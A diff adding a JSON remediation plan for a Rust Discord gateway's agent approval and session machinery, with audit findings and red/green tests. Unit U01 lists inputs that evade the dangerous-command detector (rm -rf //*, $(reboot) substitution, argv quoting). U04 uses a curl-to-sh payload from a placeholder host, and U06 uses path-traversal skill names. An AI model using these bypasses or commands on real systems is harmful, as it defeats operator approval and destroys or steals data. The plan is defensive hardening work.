@@ -1,0 +1,1672 @@
+{
+  "units": [
+    {
+      "id": "U01",
+      "title": "Detector executable semantics",
+      "findings": [
+        "AP.AP04"
+      ],
+      "files": [
+        "src/security/normalize.rs",
+        "src/security/hardline.rs",
+        "src/tools/terminal.rs"
+      ],
+      "tests": [
+        "src/security/normalize.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP04 | P0 #3 + residual #2 dangerous engine | FIX-D, confirmed | `src/security/normalize.rs:647-815,850-1023`, `src/security/hardline.rs:27`, `src/tools/terminal.rs:281-305`; H:`tools/approval.py:434,1214-1314,1383-1552`. Real bypasses and argv corruption detailed below; no longer a 25-line stub. Existing `security::tests::test_dangerous_categories`, `test_inline_interpreter_payloads`, `test_grep_isolation_and_benign_commands` cover baseline but not these payloads. |",
+      "scenario": "### AP04 - repair semantics, not regex quantity\n\nFour independently reproducible classes share detector scope:\n- `rm -rf //*`: root regex permits dot-slash groups but not empty slash groups; Never reaches execution. Hermes line 434 explicitly handles repeated slashes. Pure detector RED=None/GREEN=hardline; do not execute.\n- `echo \"$(reboot)\"` and `grep \"$(reboot)\" file`: masker erases non-inert operands despite storing inert_single_quoted; no payload extractor restores reboot. Direct detector RED=None/GREEN=hardline, while `echo 'reboot'` stays benign. For local surface QA, a temporary executable named reboot only writes a marker; Never must block before it runs. Literal root payloads remain detector-only.\n- `python3 -cprint(1)`, `node --eval=process.exit(0)`, `rg --pre ./helper needle file`: attached flags/program-bearing read options are not parsed; no dangerous pattern fires. Hermes `1383-1552` handles these. RED=not dangerous/GREEN=gated; helper QA writes a temp marker and is not invoked before consent. Include benign `python script.py -c` and `bash --norc script.sh` controls (current parser falsely interprets positional/long-option data as execution).\n- Terminal joins argv without quoting. `{\"program\":\"rm\",\"args\":[\"-rf\",\"/tmp/a'b\"]}` becomes unmatched shell syntax and misses recursive detection (`rm` is not program-bearing malformed fallback); real exec removes that directory. Similarly printf arguments containing a single unmatched quote fail hardline parsing despite being valid argv. Preserve argv ownership, and inspect actual shell payload only when an interpreter owns it.\n\nScope: security normalize/hardline plus terminal command representation. Test `approval_detector_preserves_executable_semantics`; `cargo test --lib approval_detector_preserves_executable_semantics`. Use actual TerminalTool + rejecting requester on temp `a'b`: RED removed with zero prompts/GREEN untouched and one request. Existing classifier tests remain controls. These are dormant-path defects, not proof of daemon bypass.\n\n",
+      "redCommand": "cargo test --lib approval_detector_preserves_executable_semantics"
+    },
+    {
+      "id": "U02",
+      "title": "Namespaced multi-tool approval scopes",
+      "findings": [
+        "AP.AP06"
+      ],
+      "files": [
+        "src/tools/mod.rs",
+        "src/discord/approval.rs"
+      ],
+      "tests": [
+        "src/tools/mod.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP06 | P2 multi-tool approval hooks | FIX-D, confirmed | `src/tools/mod.rs:135-152` sends only `<name>` to requester; `src/discord/approval.rs:190` derives key from that; `src/tools/mcp.rs:235-250` multiplexes different clients under `mcp`. H:`tools/approval.py:2995-3022` explicitly namespaces by rule key or tool+reason hash. An Always on one flagged MCP operation approves unrelated flagged operations. Existing `test_tool_approval_hook_dispatch_approved/denied` use Once only. |",
+      "scenario": "### AP06 - distinguish tool rules\n\nMinimal namespaced stable rule identity (explicit key or name+reason digest), separate from display text. Scope `src/tools/mod.rs` and requester key API; coordinate AP08 at requester seam. Test `tool_approval_scopes_do_not_cross_rules`; `cargo test --lib tool_approval_scopes_do_not_cross_rules`. Approve `<mcp>` rule A Always, then invoke client B with different flagged reason. RED=autoapproved/GREEN=new prompt. QA via real registry, guard, SQLite and local two-method MCP fixture; retain broad category grants for terminal.\n\n",
+      "redCommand": "cargo test --lib tool_approval_scopes_do_not_cross_rules"
+    },
+    {
+      "id": "U03",
+      "title": "Cancellation-safe approval lifetime",
+      "findings": [
+        "AP.AP08"
+      ],
+      "files": [
+        "src/discord/approval.rs",
+        "src/discord/adapter.rs",
+        "src/dashboard.rs"
+      ],
+      "tests": [
+        "src/discord/approval.rs"
+      ],
+      "dependsOn": [
+        "U02"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP08 | P1 timeout buttons, `/deny`, cancellation, session cleanup | FIX-D, confirmed | `src/discord/approval.rs:203-245,343-345,377-414`; adapter `1000-1020,2323-2342`; dashboard `338-365,1893-1897`; H:`tools/approval.py:2059-2106,2144-2160,3089-3097,3133-3162`. Timeout expires only on a normally completed error path; dropping requester bypasses cleanup. Success never clears egress tracking/dashboard pending; `/deny`/dashboard leave Discord buttons active. `/deny` picks newest matching channel and ignores bot identity, permitting denial of another bot's pending operation. |",
+      "scenario": "### AP08 - single terminal lifecycle / exact lane\n\nMinimal cancellation-safe pending lease, one resolution/expiry event consumed by both surfaces, exact bot/channel/thread session lane matching and FIFO deny; clear pending waiters on true session cleanup. Return delivery error for cached dead target instead of `Ok(())` (`adapter.rs:2277-2282`) so requester does not wait on an unsent prompt. Scope approval.rs, adapter resolution/egress, dashboard pending reducer. Test `approval_lifecycle_cleans_all_surfaces_and_isolates_bots`; `cargo test --lib approval_lifecycle_cleans_all_surfaces_and_isolates_bots`. Two pending requests same channel different bot IDs: deny A must leave B untouched (RED picks newest B); drop requester after observed dispatch (RED pending_count=1/GREEN=0); successful resolution leaves no dashboard/egress entry; dead-target dispatch fails immediately. QA local OutboundDispatcher captures real state transitions and serialized disabled-button edit, no network Discord calls.\n\n",
+      "redCommand": "cargo test --lib approval_lifecycle_cleans_all_surfaces_and_isolates_bots"
+    },
+    {
+      "id": "U04",
+      "title": "Redact approval display copies",
+      "findings": [
+        "AP.AP10"
+      ],
+      "files": [
+        "src/discord/approval.rs",
+        "src/security/mod.rs",
+        "src/security/approval_display.rs"
+      ],
+      "tests": [
+        "src/discord/approval.rs"
+      ],
+      "dependsOn": [
+        "U03"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP10 | Approval display/file-terminal secret boundary | FIX-D, confirmed | `src/discord/approval.rs:205-211`, adapter `2285-2298`, dashboard `350-360` carry raw command/reason. H:`tools/approval.py:2298-2305,3455-3463` redacts display copies. A flagged command containing a credential becomes persistent channel/dashboard content, even if denied. |",
+      "scenario": "### AP10 - redact only display copies\n\nMinimal shared credential redactor before outbound ApprovalRequest/dashboard storage; keep raw execution args and stable policy keys private. Scope new display sanitizer plus request construction; serialize with AP06/AP08. Test `approval_display_redacts_credentials_without_changing_execution`; `cargo test --lib approval_display_redacts_credentials_without_changing_execution`. Payload `curl -H 'Authorization: Bearer sentinel-secret-123' https://example.invalid/install | sh`. RED sentinel present in serialized outbound/GREEN absent; raw execution fixture receives unchanged token only after approval. QA capture dispatcher JSON and embed with local sink; no outbound curl.\n\n",
+      "redCommand": "cargo test --lib approval_display_redacts_credentials_without_changing_execution"
+    },
+    {
+      "id": "U05",
+      "title": "Faithful Tirith outcomes",
+      "findings": [
+        "AP.AP12"
+      ],
+      "files": [
+        "src/security/tirith.rs",
+        "src/tools/terminal.rs"
+      ],
+      "tests": [
+        "src/security/tirith.rs"
+      ],
+      "dependsOn": [
+        "U01"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP12 | P2 external scanner/Tirith | FIX-D, confirmed | `src/security/tirith.rs:43-100`, terminal `191-201`; H:`tools/approval.py:3254-3261,3352-3379,3424-3438`. `warn` and malformed `{}` responses become Allow even with fail_open=false; block becomes unconditional and cannot be approved. Rust scanner also runs before Never whereas Hermes skips it after hardline/deny under bypass. Existing scanner tests cover allow/block/errors only. |",
+      "scenario": "### AP12 - faithful scanner outcomes\n\nMinimal parse Allow/Warn/Block distinctly; unknown/missing schema follows fail_open; combine warnings with command gate and enforce scope maximum (no permanent Tirith-only grants). Respect Never after hardline/user deny, not scanner before it. Scope security/tirith.rs + terminal scan ordering (serialize after AP04). Test `scanner_warning_and_invalid_payload_never_silently_pass`; `cargo test --lib scanner_warning_and_invalid_payload_never_silently_pass`. Local scanner serves `{\"action\":\"warn\",\"findings\":[{\"rule_id\":\"x\",\"title\":\"risk\"}]}` then `{}` with fail_open=false. RED both Allow/GREEN warning prompt and fail-closed invalid response; Never skips scanner but still rejects hardline. QA actual local HTTP scanner + terminal harmless echo, count requests/execution, no live service.\n\n",
+      "redCommand": "cargo test --lib scanner_warning_and_invalid_payload_never_silently_pass"
+    },
+    {
+      "id": "U06",
+      "title": "Confine staged skill writes",
+      "findings": [
+        "AP.AP13"
+      ],
+      "files": [
+        "src/tools/skills.rs",
+        "src/storage/db.rs"
+      ],
+      "tests": [
+        "src/tools/skills.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP13 | P1 memory/skill staging filesystem boundary | FIX-D, confirmed | `src/tools/skills.rs:171-215`, `src/storage/db.rs:354-382`; H:`tools/skill_manager_tool.py:492-512,816`, H:`tools/write_approval.py:118-156`. Skill name accepts absolute paths, `../`, and symlinked skill dirs, then joins/writes SKILL.md outside roots; replay repeats vulnerability. If WRITE_APPROVAL=true with no pool, direct write silently proceeds. |",
+      "scenario": "### AP13 - skill root and fail-closed staging\n\nMinimal parse single safe skill name, canonical containment including symlinked target, same validation on replay; missing store with enabled approval returns error, never writes. Scope tools/skills.rs + shared staged skill apply boundary (storage/db.rs). Test `skill_writes_cannot_escape_or_bypass_staging`; `cargo test --lib skill_writes_cannot_escape_or_bypass_staging`. Name `../outside` and absolute temp outside path, then in-root symlink to outside; RED outside/SKILL.md exists/GREEN error and absent. WRITE_APPROVAL=true without pool: RED saved/GREEN error, no file. QA both direct Tool call and seeded pending row through production apply function inside temp roots. No production agent write caller currently established.\n\n",
+      "redCommand": "cargo test --lib skill_writes_cannot_escape_or_bypass_staging"
+    },
+    {
+      "id": "U07",
+      "title": "Atomic exact-destination replay",
+      "findings": [
+        "AP.AP14"
+      ],
+      "files": [
+        "src/tools/skills.rs",
+        "src/storage/db.rs",
+        "src/memory/store.rs"
+      ],
+      "tests": [
+        "src/tools/skills.rs"
+      ],
+      "dependsOn": [
+        "U06"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP14 | P1 staged write destination / replay integrity | FIX-D, confirmed | Skills stages only name/content (`src/tools/skills.rs:183-194`), direct write uses first configured root (`200-208`); replay defaults to ~/.omon/skills (`src/storage/db.rs:365-379`), slash caller passes None (`src/discord/commands.rs:270`). H:`tools/write_approval.py:120-123,142-149` stores replay kwargs. Approval may save a different skill than direct write, leaving higher-precedence Hermes skill unchanged. Memory replay reads then inserts then deletes outside a transaction (`src/storage/db.rs:313-352`): concurrent approvals can apply twice. Existing `test_pending_writes_store_round_trip` passes an explicit skill root, masking production mismatch. |",
+      "scenario": "### AP14 - exact replay / atomic consumption\n\nMinimal persist configured destination identity with skill payload and resolve against authorized roots; replay must target same root as direct write. Atomic claim/transaction for memory insert+pending delete; ensure real session metadata before staging rather than inserting dummy unknown channel/user during approval. Scope storage/db.rs, skills staging payload, memory/store.rs. Test `staged_write_replays_once_to_original_destination`; `cargo test --lib staged_write_replays_once_to_original_destination`. Stage skill x with custom root A and default B different; RED B written/GREEN only A. Two simultaneous approvals of one memory using barrier before claim: RED can create two rows/GREEN exactly one applied, loser not-found. QA SQLite + temp directories with production apply API; extend existing roundtrip beyond explicit-root test-only path.\n\n",
+      "redCommand": "cargo test --lib staged_write_replays_once_to_original_destination"
+    },
+    {
+      "id": "U08",
+      "title": "Session-scoped full pending review",
+      "findings": [
+        "AP.AP15"
+      ],
+      "files": [
+        "src/discord/commands.rs",
+        "src/storage/db.rs"
+      ],
+      "tests": [
+        "src/discord/commands.rs"
+      ],
+      "dependsOn": [
+        "U07"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP15 | P1 write review UX and session memory isolation | FIX-L/D, confirmed | `src/discord/commands.rs:243-289,418-466` lists all pending memories, not current session, and applies/rejects an ID of either kind; skills show name only, memories truncate to 80 chars; no pending detail/diff route in dashboard or commands. H:`tools/write_approval.py:25-38,168-176,435-491` has detail/diff affordance. Rust normal memory list/search are session-scoped (`commands.rs:469-475`, `src/memory/store.rs:106-115`), but staging loses that boundary. |",
+      "scenario": "### AP15 - scoped, reviewable pending records\n\nMinimal kind/session filtering before list/read/approve/reject; preserve per-agent memory contract, not universal requester-only approval. Provide full pending memory detail and skill diff/download before consent, with pagination/attachment rather than oversized ctx.say. Scope commands.rs pending branches and typed pending APIs (serialize after AP14); optional dashboard detail route. Test `pending_review_preserves_session_kind_and_full_payload`; `cargo test --lib pending_review_preserves_session_kind_and_full_payload`. Session A stages `private-sentinel`; B requests pending => RED sentinel visible/GREEN absent. `/skills approve <memory-id>` => RED memory applied/GREEN wrong-kind error. Skill malicious change after first 80 chars must be available from local detail response before approve. QA seed real SQLite and exercise extracted slash service/HTTP detail, check records/content rather than prose.\n\n",
+      "redCommand": "cargo test --lib pending_review_preserves_session_kind_and_full_payload"
+    },
+    {
+      "id": "U09",
+      "title": "Fail-closed shared admission",
+      "findings": [
+        "D.D02"
+      ],
+      "files": [
+        "src/discord/commands.rs",
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U03",
+        "U08"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | D02 | P1 role/pairing auth, channel allow/ignore; security newly verified | FIX | C:157-174 authorizes everyone when both lists are empty, despite allow_all=false; called by R:1178, component handler R:980, C:179 command_check, C:1088 pair. C:179-205 never checks channel lists, so `/steer` and `/thread` run in an ignored/non-allowed channel. R:1162-1173 checks only exact channel, not parent: ignored parent does not block child; allowed parent cannot admit child. H:1249-1296,4195-4379 fail closed and enforce parent-aware channel gates on both surfaces. Existing tests explicitly pin open default and exact-channel cases, not safe parity. |",
+      "scenario": "| D02 | C::command_check/is_user_authorized plus R::message_to_inbound channel-policy branch; explicit opt-in for open auth and shared parent gate. | `cargo test --test test_discord_adapter authorization_surface_matrix` : user 10, lists empty, allow_all=false; then allowed user invokes steer in ignored parent 7/thread 8. Currently admitted -> both rejected before runner; allowed parent admits its nonignored child. Update existing tests pinning open defaults. |",
+      "redCommand": "cargo test --test test_discord_adapter authorization_surface_matrix"
+    },
+    {
+      "id": "U10",
+      "title": "Pairing notification and lockout state",
+      "findings": [
+        "AP.AP18"
+      ],
+      "files": [
+        "src/discord/pairing.rs",
+        "src/discord/adapter.rs"
+      ],
+      "tests": [
+        "src/discord/pairing.rs"
+      ],
+      "dependsOn": [
+        "U09"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP18 | P2 DM pairing flow/rate limiting/lockout | FIX-L, confirmed | `src/discord/adapter.rs:941-959`, `src/discord/pairing.rs:122-163,184-198`; H:`gateway/authz_mixin.py:607-725`, H:`gateway/pairing.py:452-486,611-630`. Every rejected DM resends the reused code (not notification rate limiting); no-allowlist users receive no code while configured allowlist users get unsolicited codes (reverse Hermes default). Lockout is stored on replaceable rows: a new DM after five failures rotates the code with attempts=0. No pending-cap/global expired cleanup. |",
+      "scenario": "### AP18 - real pairing rate/lockout state\n\nMinimal separate code issuance/notification state and platform lockout deadline, bounded pending count with expiry cleanup, explicit unauthorized-DM policy matching ignore-with-allowlist / pair-without default. Do not make paired users operators. Scope pairing.rs + adapter unauthorized-DM branch. Test `pairing_throttles_notifications_and_preserves_lockout`; `cargo test --lib pairing_throttles_notifications_and_preserves_lockout`. Repeated rejected DM at same injected timestamp => RED two sends/GREEN one; five invalid operator approvals then fresh DM => RED new attempts=0 code/GREEN locked until deadline. QA real SQLite store with injected clock and captured send decisions; test no-allowlist/allowlist default matrix. Hashing/revocation/list remain feature parity recommendations, not prerequisites to claim a guessed-code authorization bypass.\n\n",
+      "redCommand": "cargo test --lib pairing_throttles_notifications_and_preserves_lockout"
+    },
+    {
+      "id": "U11",
+      "title": "Coherent yolo lifecycle",
+      "findings": [
+        "AP.AP22"
+      ],
+      "files": [
+        "src/discord/commands.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "src/discord/commands.rs"
+      ],
+      "dependsOn": [
+        "U09"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP22 | P1 `/yolo` session toggle behavior | FIX-L/D, confirmed | `src/discord/commands.rs:996-1022` persists state.yolo and sets guard; restart loads allowlist but not yolo (`src/main.rs:1175-1183`), OMO ignores guard entirely (AP02). `/reset` (`commands.rs:572-589`) clears session state without clearing guard; guard.clear_session has no production caller. H:`tools/approval.py:2127-2160` has coherent session clear/bypass. DB toggle state and effective grant can disagree, even toggling off while operator expects on after restart. |",
+      "scenario": "### AP22 - coherent session toggle\n\nMinimal one source of truth for effective yolo; synchronize on restart/reset and daemon bridge. Prefer runtime-only session bypass matching Hermes; if retaining persistence, restore it explicitly and toggle against effective state. Scope commands.rs yolo/reset + startup restore seam; AP02 owns daemon forwarding. Test `yolo_toggle_matches_effective_state_across_reset_and_restart`; `cargo test --lib yolo_toggle_matches_effective_state_across_reset_and_restart`. Enable, reload process guard, toggle; RED persisted true but effective false and toggle selects false/GREEN consistent effective/displayed state. Reset => RED cached grant survives/GREEN disabled. QA real SQLite+new guard instance and slash service, no new dedicated session creation.\n\n",
+      "redCommand": "cargo test --lib yolo_toggle_matches_effective_state_across_reset_and_restart"
+    },
+    {
+      "id": "U12",
+      "title": "Correlate remote turn frames",
+      "findings": [
+        "S.F06"
+      ],
+      "files": [
+        "src/agent/omo_backend.rs",
+        "src/agent/omo_protocol.rs"
+      ],
+      "tests": [
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F06 | OMO event/session isolation and terminal ACK | FIX P0 | `omo_backend.rs:505-558` accepts item/delta events without thread/turn checks; completion validates thread only and accepts missing thread ID (`559-594`); never requires successful start ACK before output. Same-thread stale completion can finalize partial content; other-thread item text/errors can contaminate/abort current turn. `interrupted` terminal is treated as success. H: `stream_events.py:54-67`, `turn_lease.py:277-302` generation ownership. Existing other-thread completion test only covers that one terminal case (`tests/test_omo_backend.rs:1589`). |",
+      "scenario": "| F06 | B: correlate every turn-bearing frame to current thread/turn, require ACK, distinguish interrupted/failed, ignore stale idle. `cargo test --test test_omo_backend rejects_foreign_and_stale_turn_frames` | ACK r1/t2, foreign delta r9/t9 SECRET, completion r1/t1, then r1/t2 OK. RED SECRET/early final; GREEN sole final OK. QA same-thread reconnect/subscription replay fixture, include interrupted and pre-ACK terminal cases. |",
+      "redCommand": "cargo test --test test_omo_backend rejects_foreign_and_stale_turn_frames"
+    },
+    {
+      "id": "U13",
+      "title": "Interrupt actual remote work",
+      "findings": [
+        "S.F04",
+        "R.R11"
+      ],
+      "files": [
+        "src/agent/backend.rs",
+        "src/agent/omo_backend.rs",
+        "src/multiplexer/actor.rs"
+      ],
+      "tests": [
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U12"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F04 | P0 #5 cancellation; P2 /stop | FIX P0 | Actor drops run future before `runner.cancel` (`actor.rs:210,327-330`); OMO implements only run (`omo_backend.rs:713-741`), inherits no-op cancel (`backend.rs:50-52`). `/stop` acknowledges cancellation locally but remote tools continue; next turn queues behind remote work. All silence/error exits likewise omit interrupt. H: `turn_lease.py:277-302`, `session.py:2183-2196`. Immediate OMO peer trace below confirms socket close is not cancellation. | | R11 | P2 /stop suspended state + typing cleanup | FIX P1 | `src/discord/commands.rs:595-610` -> `src/multiplexer/router.rs:253-277` -> actor `:175-185,209-210,329-342`; `src/agent/backend.rs:38-53`; `src/agent/omo_backend.rs:715-742`; `src/discord/adapter.rs:1842-1905,2202-2219` | `H:gateway/run.py:4723` (suspend preserves state) and `H:gateway/shutdown_watchdog.py:1-18` (work lifecycle). Local stop/suspension and Typing(false) exist, but OmoBackend uses default no-op cancel: dropping WS does not send `turn/interrupt` to the multiplexed daemon. Separate confirmed typing leak: final stream clears typing_refresh, never the persistent Typing guard; normal completion/error leaves repeating typing until explicit stop or process exit. This is lifecycle cleanup, not permission to add Discord interim messages. |",
+      "scenario": "| F04 | B: retain active remote turn identity independently of dropped future; cancel sends/awaits interrupt ACK with bound before local success; cleanup all terminal failure exits. `cargo test --test test_omo_backend stop_interrupts_remote_turn_before_ack` | Start t1 and hold remote tool; mux.stop. RED socket closes without interrupt; GREEN `{method:\"turn/interrupt\",params:{threadId:\"r1\",turnId:\"t1\"}}` observed before stop success. QA server keeps work alive on disconnect (faithful peer behavior), checks no post-stop tool completion. |\n\n- **R11 / A+I+J:** lifecycle-owned Typing(false) on every terminal path; OMO must interrupt actual turn before stop acknowledgment, preserving thread/session identity. Backend cancellation edit is protected and must be merged by lead/owner. `cargo test --lib turn_terminal_paths_release_typing -- --nocapture`; `cargo test --test test_omo_backend stop_interrupts_remote_turn -- --nocapture`. Payload: active daemon turn `t1`, stop; separately success/error/silence. RED no interrupt frame / typing guard retained; GREEN interrupt ACK before stopped and zero guards for finished session, another active session unaffected. QA: actual protocol fake WS holds turn until interrupt (disconnect must NOT simulate cancellation); recording typing transport signals guard drop. Existing actor stop test proves only local future cancellation.",
+      "redCommand": "cargo test --test test_omo_backend stop_interrupts_remote_turn_before_ack && cargo test --lib turn_terminal_paths_release_typing -- --nocapture && cargo test --test test_omo_backend stop_interrupts_remote_turn -- --nocapture"
+    },
+    {
+      "id": "U14",
+      "title": "Absolute interactive deadline",
+      "findings": [
+        "S.F05"
+      ],
+      "files": [
+        "src/agent/omo_backend.rs"
+      ],
+      "tests": [
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U13"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F05 | 300s interactive cap / OMO acknowledgements | FIX P0 | `omo_backend.rs:111-113,177-180,297-299` reset request timeout for every handshake frame (default 600s, config:57-64); total clock starts only at line 389. No-frame turn ACK waits 120s, not 30s (`411-419`); total check runs only on frame arrival and excludes every turn/completed (`443`), before identity validation. Reconnect starts a new budget. A pinging initialize can hang indefinitely; silent streaming can exceed total until next frame/gap. H: `turn_lease.py:191-214` bounded wait; 300s is user invariant, not Hermes timeout parity. |",
+      "scenario": "| F05 | B: one absolute interactive deadline spans connect/initialize/resume/start/stream/retry; separately bounded ACK deadline; select timer independently of incoming frames. `cargo test --test test_omo_backend interactive_deadline_bounds_all_protocol_phases` | Parameterize blocked connect, initialize, thread/start, thread/resume, turn/start ACK, and streaming with request_timeout=600s and total_timeout=1800s; measure from entry to public backend.run, not streaming start. For setup, hold the matching response behind a server-received-request signal and advance virtual time beyond 300s (also test non-ACK frames). For retry, spend 250s in first initialize, return JSON-RPC error id=1/message=\"Connection reset\" to exercise the current retry branch before any turn acceptance, observe second initialize after its 500ms cooldown, then hold that response and advance to original start+300s. RED run remains pending with a renewed setup budget; GREEN run returns deadline error by the original 300s boundary, with no turn/start after expiry. Use the smaller configured total cap too. An ACKed active turn additionally requires bounded interrupt cleanup. QA real public run->loopback WebSocket, explicit request signals/response gates and controlled Tokio clock (migrate std::time::Instant comparisons consistently); no fixed sleeps or outer test timeout mistaken for backend enforcement. Re-read run at omo_backend.rs:716-740: neither first nor retry run_once has an outer timeout. Existing edge-completion expectation needs explicit reconciliation, not blind deletion. |",
+      "redCommand": "cargo test --test test_omo_backend interactive_deadline_bounds_all_protocol_phases"
+    },
+    {
+      "id": "U15",
+      "title": "No accepted-turn resubmission",
+      "findings": [
+        "S.F07"
+      ],
+      "files": [
+        "src/agent/omo_backend.rs"
+      ],
+      "tests": [
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U14"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F07 | Durable dedup across reconnect | FIX P0 | `omo_backend.rs:716-738` reruns run_once after mid-turn socket close, which sends another turn/start at 358; protocol sends no stable client input ID (`omo_protocol.rs:62-80`). An already accepted mutating task executes twice. Existing retry test drops TCP BEFORE handshake (`tests/test_omo_backend.rs:146-152,1390`), not after acceptance. H: `session.py:2663-2680`, `turn_lease.py:1-24`. |",
+      "scenario": "| F07 | B: retry only proven pre-accept failures; accepted/ambiguous disconnect resumes observation or fails without resubmitting side effects, unless daemon supports real idempotency. `cargo test --test test_omo_backend accepted_disconnect_does_not_resubmit_turn` | Daemon ACKs and records counter increment, closes stream before terminal. RED two turn/start/increments; GREEN one. QA real backend reconnect path against stateful peer (not existing pre-handshake-drop fixture). |",
+      "redCommand": "cargo test --test test_omo_backend accepted_disconnect_does_not_resubmit_turn"
+    },
+    {
+      "id": "U16",
+      "title": "Durable remote conversation binding",
+      "findings": [
+        "S.F08"
+      ],
+      "files": [
+        "src/agent/omo_backend.rs",
+        "src/multiplexer/actor.rs",
+        "src/storage/db.rs"
+      ],
+      "tests": [
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U08",
+        "U13",
+        "U15"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F08 | Conversation stickiness after failed first turn / restart | FIX P1 | New remote binding is only in turn_context/cache (`omo_backend.rs:308-318`); actor copies/flushed context only on success (`actor.rs:212-223`). First-turn failure/crash loses durable thread binding. On missing rollout it silently starts replacement (`omo_backend.rs:194-201,289-318`) and sends only latest input, not stored history (`347-360`). Context disappears despite permanent-session invariant. H: `session.py:1449-1500,1786-1826`. Existing stale-thread test deliberately expects replacement but never asserts history preservation (`tests/test_omo_backend.rs:1131`). |",
+      "scenario": "| F08 | B: persist new binding before turn/start; do not silently replace missing history (fail explicitly or restore available canonical history). `cargo test --test test_omo_backend failed_first_turn_keeps_durable_binding` | thread/start r1; turn fails; reconstruct backend/mux from file DB. RED second thread/start; GREEN resume r1. Missing-rollout subcase: RED silent fresh history, GREEN explicit continuity error or restored exchange. QA wire transcript verifies binding across process recreation. |",
+      "redCommand": "cargo test --test test_omo_backend failed_first_turn_keeps_durable_binding"
+    },
+    {
+      "id": "U17",
+      "title": "Canonical recovery bot identity",
+      "findings": [
+        "S.F01",
+        "R.R03"
+      ],
+      "files": [
+        "src/models/session.rs",
+        "src/storage/db.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "src/models/session.rs"
+      ],
+      "dependsOn": [
+        "U11",
+        "U16"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F01 | P1 restart resume; recovery isolation | FIX P0 | `storage/db.rs:133-166` selects canonical key then discards it, reconstructing with `SessionKey::new` (bot=None); `main.rs:374-383` clears/queries reconstructed key. Discord always adds bot (`discord/adapter.rs:1290-1301`); `models/session.rs:37,66-68` proves different storage keys. Normal bot sessions never resume; a legacy matching row can be touched instead. Outbox recovery `main.rs:303-325` loses bot too, routing through default identity (`adapter.rs:1801-1810`). H: `session.py:1396-1414,1547-1592,2198-2245`. | | R03 | P1 recovery, per-bot permanent sessions | FIX P1 | `src/storage/db.rs:135-167`; `src/main.rs:374-382`; actor session insert `src/multiplexer/actor.rs:520-541` | `H:gateway/run.py:9030-9040` retains canonical keys. Rust selects canonical `session_key` but discards it and rebuilds five-component SessionKey without bot_id. Recovery then clears/looks up the wrong storage key; current bot-scoped row remains pending and is not replayed. Same identity loss in outbound recovery `src/main.rs:311-317`; output identity owner should incorporate this shared issue, not count it twice. |",
+      "scenario": "| F01 | A: durably serialize full SessionKey, preserve canonical key and bot on load/outbox reconstruction. `cargo test --bin omo-gateway recovery_preserves_bot_identity` | Seed bot 42/84 same DM coordinates with pending input; recover. RED 0 runs/default-bot output; GREEN each exact key once, bot unchanged. QA boot-recovery function into real mux and capturing dispatcher. |\n\n- **R03 / B:** recover canonical key, preserving bot_id; share parser rather than rebuilding coordinates. `cargo test --lib resume_pending_preserves_bot_identity -- --nocapture`. Payload: otherwise identical bot-A and bot-B rows, only B pending. RED: returned key lacks B; GREEN: exact B key, only B recovery eligibility changed. QA: real SQLite recovery sweep and recording dispatch identity; include outbound-ledger identity case with its owner. Existing main:1763 fixture has no bot ID.",
+      "redCommand": "cargo test --bin omo-gateway recovery_preserves_bot_identity && cargo test --lib resume_pending_preserves_bot_identity -- --nocapture"
+    },
+    {
+      "id": "U18",
+      "title": "Fail before undurable side effects",
+      "findings": [
+        "S.F15"
+      ],
+      "files": [
+        "src/multiplexer/actor.rs",
+        "src/storage/db.rs"
+      ],
+      "tests": [
+        "tests/test_multiplexer.rs"
+      ],
+      "dependsOn": [
+        "U16",
+        "U17"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | F15 | Transcript durability / fail-fast | FIX P1 | `actor.rs:127-129` logs failed user persistence and still runs remote side effects; success flush failure is logged then delivered acknowledged (`220-226`). Replays can execute without durable dedup/history/binding. H: `session.py:2514-2577` retry queue, `2682-2703` explicit failure result. Triggerable SQLite failure, not a hypothetical missing feature. |",
